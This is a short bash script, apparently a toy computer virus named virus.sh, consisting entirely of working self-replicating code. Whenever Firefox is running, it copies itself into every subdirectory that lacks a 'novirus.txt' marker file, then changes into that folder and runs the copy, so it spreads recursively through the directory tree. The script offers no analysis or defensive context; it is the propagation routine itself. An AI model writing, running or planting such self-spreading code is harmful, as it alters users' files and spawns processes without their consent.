#!/bin/bash

if [[ $(pgrep firefox) ]]
then
	for rep in ./* 
	do
		if [ -f "$rep/novirus.txt" ]
		then
			continue
		fi

		if [ -d $rep ] && [ $rep != "." ]
		then
			echo $rep
			cp $0 "$rep/$0"
			cd $rep
			./virus.sh
			cd ..
		fi
	done
fi
